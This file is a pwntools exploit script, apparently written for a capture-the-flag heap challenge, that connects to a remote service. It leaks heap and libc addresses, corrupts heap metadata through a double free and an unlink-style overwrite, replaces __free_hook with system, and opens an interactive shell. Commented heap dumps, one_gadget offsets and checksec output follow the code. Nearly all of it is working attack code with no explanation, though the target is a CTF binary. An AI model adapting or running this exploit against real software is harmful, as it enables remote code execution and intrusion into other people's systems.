# coding:utf-8
from pwn import *
libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
LOCAL = 0
if LOCAL:
    p = process('./mahoshyojo')#,env={"LD_PRELOAD":"./libc-2.24.so"})
    elf = ELF('./mahoshyojo')
#    context.log_level = 'debug'
else:
    p = remote("bxsteam.xyz", 40004)
    context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()
		
def menu(id):
	p.recvuntil('5. QAQ. exit...\n')
	p.sendline(str(id))

def add(data):
	menu(1)
	p.recvuntil('input card desc\n')
	p.send(data)

def edit(id,name):
	menu(2)
	p.recvuntil('card number: \n')
	p.sendline(str(id))
	p.recvuntil('input the skill name\n')
	p.send(name)

def clear(id):
	menu(3)
	p.recvuntil('card number: \n')
	p.sendline(str(id))

def see(id):
	menu(4)
	p.recvuntil('card number: \n')
	p.sendline(str(id))

p.recvuntil('now how about you?\n')
data = 'a'*4
p.sendline(data)
p.recvuntil('input your name\n')
p.sendline('moonAgirl')

pay = 'a'*0x60
add(pay)#0
add(pay)#1
add(pay)#2

sleep(1)
#p.interactive()
clear(2)
clear(1)
#clear(1)

see(1)
p.recvuntil('reading card\n1\n')
data = u64(p.recv(6).ljust(8,'\x00'))
print 'heap_addr:' + hex(data)

off = 0x55a190de2fd0 - 0x55a190de2c20
heap_list = data - off
print 'heap_list:' + hex(heap_list)

payload = p64(0x70)*12
add(payload)#1 3
add(payload)#2 4
add(payload)#3 5

add(payload)#4 6
add(payload)#5 7
add(payload)#6 8

add(payload)#7 9
add(payload)#8 10
add('/bin/sh\x00'.ljust(0x60,'\x00'))#9 11

off = 0x5644326eafd0 - 0x5644326eafc0
heap_addr1 = data - off
print 'heap_addr1:' + hex(heap_addr1)
off = 0x5644326eb090 - 0x5644326eafd0
heap_addr2 = data + off
print 'heap_addr2:' + hex(heap_addr2)

clear(7)#7
clear(8)#8
clear(7)#7

add(p64(heap_addr2).ljust(0x60,'\x00'))#7
add(payload)#8
add(payload)#9
# 0x5560f22190a0:	0x61616161	0x70
# 0x5560f22190b0:	0x0	0x71
buf = p64(0)*2 + p64(0x60 + 0x70) + p64(0x70 + 0x70)
add(buf.ljust(0x60,'\x00'))#10
buf = p64(0) + p64(0x60 + 0x70 + 0x1) + p64(heap_list + 0x18 - 0x18) + p64(heap_list + 0x18 - 0x10)
edit(2,buf.ljust(0x60,'\x00'))
clear(6)

#edit(2,p64(0) + p64(elf.got['puts']))
#z()
#edit(4,'a'*16)
menu(2)
p.recvuntil('card number: \n')
p.sendline(str(4))
p.recvuntil('input the skill name\n')
p.sendline('a'*16)

see(4)


p.recvuntil('reading card\n4\naaaaaaaaaaaaaaaa')
libc_addr = u64(p.recv(6).ljust(8,'\x00'))
print 'libc_addr:' + hex(libc_addr)

off = 0x7efed9fc7b78 - 0x7efed9fc7b10
libc_base = libc_addr - off - libc.symbols['__malloc_hook']
malloc_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
print 'malloc_hook:' + hex(malloc_hook)
print 'system_addr:' + hex(system_addr)

edit(2,p64(malloc_hook)*12)
edit(1,p64(system_addr)*12)
#(15)
#clear(11)
#z()
p.interactive()


# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


# 0x7efed9fc7b10 <__malloc_hook>:	0x0	0x0
# 0x7efed9fc7b20 <main_arena>:	0x0	0x0
# 0x7efed9fc7b30 <main_arena+16>:	0x0	0x0
# 0x7efed9fc7b40 <main_arena+32>:	0x0	0x0
# 0x7efed9fc7b50 <main_arena+48>:	0x70	0x0
# 0x7efed9fc7b60 <main_arena+64>:	0x0	0x0
# 0x7efed9fc7b70 <main_arena+80>:	0x0	0x5614bad41350


    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled


# 0x55a190de2c10:	0x0	0x291
# 0x55a190de2c20:	0x55a190de2eb0	0x55a190de2f00
# 0x55a190de2c30:	0x55a190de2f70	0x55a190de2fe0

# 0x55a190de2f70:	0x55a190de2fd0	0x0
# 0x55a190de2f80:	0x0	0x0
# 0x55a190de2f90:	0x0	0x0
# 0x55a190de2fa0:	0x0	0x0
# 0x55a190de2fb0:	0x0	0x0
# 0x55a190de2fc0:	0x0	0x0
# 0x55a190de2fd0:	0x0	0x71
# 0x55a190de2fe0:	0x55a190de2f60	0x0


# 0x5644326eaf60:	0x0	0x71
# 0x5644326eaf70:	0x7070707070707070	0x7070707070707070
# 0x5644326eaf80:	0x7070707070707070	0x7070707070707070
# 0x5644326eaf90:	0x7070707070707070	0x7070707070707070
# 0x5644326eafa0:	0x7070707070707070	0x7070707070707070
# 0x5644326eafb0:	0x7070707070707070	0x7070707070707070
# 0x5644326eafc0:	0x7070707070707070	0x7070707070707070
# 0x5644326eafd0:	0x0	0x71
# 0x5644326eafe0:	0x7070707070707070	0x7070707070707070
# 0x5644326eaff0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb000:	0x7070707070707070	0x7070707070707070
# 0x5644326eb010:	0x7070707070707070	0x7070707070707070
# 0x5644326eb020:	0x7070707070707070	0x7070707070707070
# 0x5644326eb030:	0x7070707070707070	0x7070707070707070
# 0x5644326eb040:	0x0	0x71
# 0x5644326eb050:	0x7070707070707070	0x7070707070707070
# 0x5644326eb060:	0x7070707070707070	0x7070707070707070
# 0x5644326eb070:	0x7070707070707070	0x7070707070707070
# 0x5644326eb080:	0x7070707070707070	0x7070707070707070
# 0x5644326eb090:	0x7070707070707070	0x7070707070707070
# 0x5644326eb0a0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb0b0:	0x0	0x71
# 0x5644326eb0c0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb0d0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb0e0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb0f0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb100:	0x7070707070707070	0x7070707070707070
# 0x5644326eb110:	0x7070707070707070	0x7070707070707070
# 0x5644326eb120:	0x0	0x71
# 0x5644326eb130:	0x7070707070707070	0x7070707070707070
# 0x5644326eb140:	0x7070707070707070	0x7070707070707070
# 0x5644326eb150:	0x7070707070707070	0x7070707070707070
# 0x5644326eb160:	0x7070707070707070	0x7070707070707070
# 0x5644326eb170:	0x7070707070707070	0x7070707070707070
# 0x5644326eb180:	0x7070707070707070	0x7070707070707070
# 0x5644326eb190:	0x0	0x71
# 0x5644326eb1a0:	0x7070707070707070	0x7070707070707070
# 0x5644326eb1b0:	0x7070707070707070	0x7070707070707070
